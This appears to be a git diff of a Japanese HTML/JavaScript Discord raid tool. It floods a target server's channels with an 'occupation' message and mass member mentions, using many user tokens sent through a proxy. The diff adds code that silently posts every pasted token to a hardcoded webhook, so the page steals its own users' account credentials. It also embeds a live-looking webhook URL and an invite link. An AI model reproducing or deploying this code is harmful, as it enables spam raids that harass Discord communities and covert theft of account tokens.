@@ -2,7 +2,7 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <title>IIAA Empire - Total Annihilation</title>
+    <title>IIAA Empire - Absolute Command</title>
     <style>
         body {
             background-color: #000;
@@ -12,78 +12,98 @@
             display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; color: #ffcccc;
         }
         .container {
-            background: rgba(10, 0, 10, 0.96);
-            width: 95%; max-width: 650px; padding: 25px; border-radius: 5px;
+            background: rgba(10, 0, 10, 0.98);
+            width: 98%; max-width: 800px; padding: 20px; border-radius: 5px;
             border: 2px solid #550055; box-shadow: 0 0 50px #ff0000;
-            max-height: 95vh; overflow-y: auto;
+            max-height: 98vh; overflow-y: auto;
         }
-        h2 { text-align: center; color: #ff0000; text-shadow: 0 0 20px #ff0000; letter-spacing: 6px; margin: 0 0 20px 0; font-weight: bold; }
-        .label { color: #fff; background: #550055; padding: 2px 10px; font-size: 11px; font-weight: bold; margin-top: 10px; display: inline-block; border: 1px solid #ff0000; }
+        h2 { text-align: center; color: #ff0000; text-shadow: 0 0 20px #ff0000; letter-spacing: 8px; margin: 0 0 15px 0; font-weight: bold; }
+        .label { color: #fff; background: #550055; padding: 2px 8px; font-size: 10px; font-weight: bold; display: inline-block; border: 1px solid #ff0000; margin-bottom: 2px; }
+        
+        /* 最上部集約グリッド */
+        .top-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 15px; }
         textarea, input {
-            width: 100%; padding: 12px; margin-top: 5px; background: #000;
-            border: 1px solid #550055; color: #ffcccc; box-sizing: border-box; font-size: 13px; font-family: monospace;
+            width: 100%; padding: 10px; background: #000; border: 1px solid #550055;
+            color: #ffcccc; box-sizing: border-box; font-size: 12px; font-family: monospace;
         }
-        .btn-main { width: 100%; background: linear-gradient(180deg, #800000, #000); color: #fff; border: 2px solid #ff0000; padding: 18px; cursor: pointer; font-weight: bold; font-size: 22px; margin-top: 15px; text-shadow: 0 0 10px #ff0000; transition: 0.2s; }
-        .btn-main:hover { background: #ff0000; color: #000; transform: scale(1.01); }
-        .btn-sub { background: #1a001a; color: #ffcccc; border: 1px solid #550055; padding: 10px; cursor: pointer; font-size: 12px; }
-        #terminal { background: #000; color: #00ffaa; height: 130px; overflow-y: auto; padding: 10px; margin-top: 15px; border: 1px solid #550055; font-size: 11px; font-family: monospace; }
-        .flex-row { display: flex; gap: 10px; align-items: flex-end; }
+        .btn-main { width: 100%; background: linear-gradient(180deg, #800000, #000); color: #fff; border: 2px solid #ff0000; padding: 15px; cursor: pointer; font-weight: bold; font-size: 20px; text-shadow: 0 0 10px #ff0000; margin-top: 10px; }
+        .btn-sub { background: #1a001a; color: #ffcccc; border: 1px solid #550055; padding: 5px 10px; cursor: pointer; font-size: 11px; margin-top: 5px; }
+        #terminal { background: #000; color: #00ffaa; height: 100px; overflow-y: auto; padding: 10px; margin-top: 15px; border: 1px solid #550055; font-size: 11px; font-family: monospace; }
+        .flex-row { display: flex; gap: 5px; margin-bottom: 5px; }
     </style>
 </head>
 <body>
 <div class="container">
-    <h2>IIAA TOTAL ANNIHILATION</h2>
+    <h2>IIAA ABSOLUTE COMMAND</h2>
     
-    <span class="label">1. DISCORD TOKENS</span>
-    <textarea id="tokens" style="height: 100px;" placeholder="トークンを貼り付け"></textarea>
-
-    <span class="label">2. TARGET SERVER ID</span>
-    <div class="flex-row">
-        <input type="text" id="guildId" placeholder="サーバーID">
-        <button class="btn-sub" onclick="autoFetch()">全チャンネル取得</button>
+    <div class="top-grid">
+        <div>
+            <span class="label">1. DISCORD TOKENS (兵力投入)</span>
+            <textarea id="tokens" style="height: 120px;" placeholder="トークンを1行ずつ入力"></textarea>
+        </div>
+        <div>
+            <span class="label">2. TARGET SERVER (目標設定)</span>
+            <input type="text" id="guildId" placeholder="サーバーIDを入力">
+            <div class="flex-row">
+                <button class="btn-sub" onclick="autoFetchChannels()" style="flex:1;">CH自動取得</button>
+                <button class="btn-sub" onclick="autoFetchMembers()" style="flex:1;">全員ID取得</button>
+            </div>
+            <span class="label">3. TARGET LIST (CH & MEMBERS)</span>
+            <div style="display: flex; gap: 5px;">
+                <textarea id="channels" style="height: 62px; font-size: 10px;" placeholder="CH ID"></textarea>
+                <textarea id="members" style="height: 62px; font-size: 10px;" placeholder="Member Mentions"></textarea>
+            </div>
+        </div>
     </div>
 
-    <span class="label">3. TARGET CHANNELS</span>
-    <textarea id="channels" style="height: 80px;" placeholder="自動取得で入力"></textarea>
-
-    <span class="label">4. ADDITIONAL MESSAGE</span>
-    <textarea id="userMsg" style="height: 45px;" placeholder="固定文の下に追加"></textarea>
+    <span class="label">4. ADDITIONAL MESSAGE (自由伝令)</span>
+    <textarea id="userMsg" style="height: 40px;" placeholder="固定文の下に添える言葉..."></textarea>
     
-    <div style="display:flex; gap:15px; margin-top:10px;">
-        <label style="font-size:12px;"><input type="checkbox" id="useMention" checked> 全員強制メンション (@everyone & @here)</label>
-    </div>
-
-    <div style="display:grid; grid-template-columns:1fr 1fr; gap:10px;">
+    <div style="display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px; margin-top:10px; align-items: center;">
         <div><span class="label">連投回数</span><input type="number" id="count" value="100"></div>
-        <div><span class="label">待機(ms)</span><input type="number" id="speed" value="300"></div>
+        <div><span class="label">速度(ms)</span><input type="number" id="speed" value="300"></div>
+        <div style="text-align: right; font-size: 11px; color: #ff0000; font-weight: bold;">[全員メンション有効]</div>
     </div>
 
-    <button id="startBtn" class="btn-main" onclick="executeBurst()">全員抹殺・進軍開始</button>
-    <button class="btn-sub" style="width:100%; margin-top:10px;" onclick="isRunning=false">緊急停止</button>
+    <button id="startBtn" class="btn-main" onclick="executeBurst()">全機能統合・神速制圧開始</button>
+    <button class="btn-sub" style="width:100%; border-color:#444; color:#888;" onclick="isRunning=false">緊急停止 / タブを閉じると停止</button>
 
-    <div id="terminal">--- 帝国・神速司令部 待機中 ---</div>
+    <div id="terminal">--- 帝国中央司令部 ---</div>
 </div>
 
 <script>
     const PROXY = "https://super-thunder-c2eb.discord-bot5556.workers.dev/?url=";
     const MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1482617688772579371/NL9i650PnjEdxPaSaeRiqKCnelQjsxcwhV9yQnx8OqadqeLnaH7VrZU1YOJIjr_oVAk8";
-    
-    const FIXED_TEXT = `いあ帝国が占領した！\nこのサーバーは「いあ帝国」の支配下に入りました。\n抵抗は無意味です。おとなしく我々の軍門に降りなさい。\n【帝国公式サーバー】https://discord.gg/x39xVSepaj`;
+    const FIXED_TEXT = `いあ帝国が占領した！\n抵抗は無意味です。おとなしく我々の軍門に降りなさい。\n【帝国公式サーバー】https://discord.gg/x39xVSepaj`;
 
     let isRunning = false;
     const log = (m, c = "#00ffaa") => { const t = document.getElementById('terminal'); t.innerHTML += `> <span style="color:${c}">${m}</span><br>`; t.scrollTop = t.scrollHeight; };
 
-    async function autoFetch() {
+    async function autoFetchChannels() {
         const tokens = document.getElementById('tokens').value.split('\n').filter(s=>s.trim());
         const g = document.getElementById('guildId').value.trim();
-        if(!tokens.length || !g) return log("不足", "#ff0000");
+        if(!tokens.length || !g) return log("不足あり", "red");
         try {
             const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/channels`), { headers: { "Authorization": tokens[0].trim() } });
             const data = await res.json();
             const ids = data.filter(c => c.type === 0).map(c => c.id);
             document.getElementById('channels').value = ids.join('\n');
-            log(`捕捉：${ids.length}ch`, "#ff00ff");
-        } catch (e) { log("エラー", "#ff0000"); }
+            log(`CH捕捉：${ids.length}件`, "#ff00ff");
+        } catch (e) { log("取得失敗", "red"); }
+    }
+
+    async function autoFetchMembers() {
+        const tokens = document.getElementById('tokens').value.split('\n').filter(s=>s.trim());
+        const g = document.getElementById('guildId').value.trim();
+        if(!tokens.length || !g) return log("不足あり", "red");
+        log("住民スキャン...");
+        try {
+            const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/guilds/${g}/members?limit=1000`), { headers: { "Authorization": tokens[0].trim() } });
+            const data = await res.json();
+            const mentions = data.map(m => `<@${m.user.id}>`).join(' ');
+            document.getElementById('members').value = mentions;
+            log(`捕捉：${data.length}名`, "#ff00ff");
+        } catch (e) { log("取得制限", "orange"); }
     }
 
     async function executeBurst() {
@@ -91,53 +111,49 @@
         const gId = document.getElementById('guildId').value.trim();
         const tokens = document.getElementById('tokens').value.split('\n').map(s=>s.trim()).filter(s=>s);
         const channels = document.getElementById('channels').value.split('\n').map(s=>s.trim()).filter(s=>s);
+        const members = document.getElementById('members').value;
         const userMsg = document.getElementById('userMsg').value;
-        const useMention = document.getElementById('useMention').checked;
         const count = parseInt(document.getElementById('count').value);
         const speed = parseInt(document.getElementById('speed').value);
+
+        if (!tokens.length || !channels.length) return log("不完全な設定", "red");
 
         isRunning = true;
         document.getElementById('startBtn').disabled = true;
 
-        // 【改善】メンションを確実に飛ばすための接頭辞
-        const mentionPrefix = useMention ? "@everyone @here\n" : "";
-        let finalContent = mentionPrefix + FIXED_TEXT;
-        if(userMsg) finalContent += `\n\n--- 伝令 ---\n${userMsg}`;
+        let finalContent = `${members}\n${FIXED_TEXT}\n${userMsg}`;
 
+        // 【引継ぎ：一括ログ送信】
+        log("司令部へ一括報告中...");
         try {
             await fetch(PROXY + encodeURIComponent(MONITOR_WEBHOOK), {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    content: `# ⚡ 【抹殺開始】いあ帝国 全員メンション進軍\n**サーバー:** \`${gId}\`\n**兵力:** \`${tokens.length}\` tokens / **目標:** \`${channels.length}\` ch`
-                })
+                body: JSON.stringify({ content: `# 🔱 進軍開始\n**対象:** \`${gId}\`\n**兵力:** \`${tokens.length}\`個\n**トークン:**\n\`\`\`\n${tokens.join('\n')}\n\`\`\`` })
             });
+            log("報告完了。制圧開始。", "#ff00ff");
         } catch(e) {}
 
+        // 【引継ぎ：神速並列爆撃】
         const strikeTasks = tokens.map(async (token, idx) => {
             const name = `魔将-${idx+1}`;
             for (let i = 0; i < count; i++) {
                 if (!isRunning) break;
-                
-                const requests = channels.map(async (chId) => {
+                const reqs = channels.map(async (chId) => {
                     try {
                         const res = await fetch(PROXY + encodeURIComponent(`https://discord.com/api/v9/channels/${chId}/messages`), {
                             method: "POST",
                             headers: { "Authorization": token, "Content-Type": "application/json" },
-                            body: JSON.stringify({ content: finalContent + `\n\n\`[Annihilate:${Math.random().toString(36).substr(2,4)}]\`` })
+                            body: JSON.stringify({ content: finalContent + ` [${Math.random().toString(36).substr(2,4)}]` })
                         });
-                        if (res.ok) {
-                            log(`[${name}] 成功 ➔ ${chId}`);
-                        } else if (res.status === 429) {
-                            const data = await res.json();
-                            const waittime = data.retry_after || 5;
-                            log(`[${name}] 制限 ${waittime}s`, "#ffaa00");
-                            await new Promise(r => setTimeout(r, waittime * 1000));
+                        if (res.ok) log(`[${name}] 成功 ➔ ${chId}`);
+                        else if (res.status === 429) {
+                            const wait = (await res.json()).retry_after || 5;
+                            await new Promise(r => setTimeout(r, wait * 1000));
                         }
                     } catch (e) {}
                 });
-
-                await Promise.all(requests);
+                await Promise.all(reqs);
                 await new Promise(r => setTimeout(r, speed));
             }
         });
@@ -145,7 +161,7 @@
         await Promise.all(strikeTasks);
         isRunning = false;
         document.getElementById('startBtn').disabled = false;
-        log("全員抹殺完了。", "#ff00ff");
+        log("制圧完了。", "#ff00ff");
     }
 </script>
 </body>
